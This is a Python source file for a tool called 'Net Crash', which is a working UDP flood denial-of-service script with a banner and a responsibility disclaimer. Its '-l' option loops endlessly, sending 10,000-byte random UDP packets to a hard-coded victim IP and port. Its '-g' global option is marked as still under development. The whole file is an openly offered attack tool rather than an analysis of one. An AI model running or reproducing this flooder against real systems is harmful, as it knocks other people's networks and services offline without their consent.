#Ne mijenjaj skriptu, pokreci sa python3!
#https://github.com/hakler25/harex.git
import sys 
import os
import time
import random
import socket
import colorama 
from colorama import Fore

#Postavke
loc_ip = "192.168.1.47"
port = 8080
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(10000)
#Postavke

os.system("clear") 

print (Fore.BLUE + "            __________")             
print (Fore.BLUE + "           /", Fore.WHITE + "HunteR_", Fore.BLUE + " \)==============[", Fore.RED + "***")          
print (Fore.BLUE + " _________/____________\__")  
print (Fore.BLUE+ "/", Fore.WHITE + "*==== _netcrash.py ====*", Fore.BLUE + "\ ") 
print (Fore.BLUE+ "|___________________________\ ")
print (Fore.BLUE + "\(@) (@) (@) (@) (@) (@) (@)/")
print (Fore.RED + "*****************************")

print ("")

print (Fore.RED + "*", Fore.GREEN + "Net Crash", Fore.WHITE + "- Thank you for using our tool but keep in mind that by using it you fully agree that", Fore.RED + "you are responsible", Fore.WHITE + "for whatever you do with the Net Crash", Fore.RED + "*")
print (Fore.WHITE + "")
print (Fore.RED + "*", Fore.WHITE + "Choose an option (", Fore.MAGENTA + "-l", Fore.WHITE + "for local attack,", Fore.MAGENTA + "-g", Fore.WHITE + "for global attack ) ")
print (" ") 
odabir = input("Option  > ")
print (" ")
sent = 0

if(odabir == "-l"):
	print("Initializing local attack...")
	time.sleep(5)
	os.system("clear")
	print (Fore.YELLOW + "       Name               Descript            Status   ")
	print (Fore.YELLOW + "+------------------++------------------++-----------------+")
	print (Fore.YELLOW + "|      AHOST       || VICTIM IP ADRESS ||  192.168.1.47   | ")
	print (Fore.YELLOW + "|      APORT       || VICTIM OPEN PORT ||  8080           | ")
	print (Fore.YELLOW + "|  ATTACK STATUS   ||        -         || ", Fore.GREEN + "ACTIVE        ", Fore.YELLOW + "| ")
	print (Fore.YELLOW + "+------------------++------------------++-----------------+")
	while True:
		sock.sendto(bytes, (loc_ip, port))
		sent = sent + 1
	
if(odabir == "-g"):
	print(Fore.RED + "Warning", Fore.WHITE + "- Global attacks are still under developement")
	exit()
	
	
if(odabir != "-l" or odabir != "-g"):
	print(Fore.GREEN + "Net Crash", Fore.WHITE + "- Choose one of the valid options to continue!")
	


















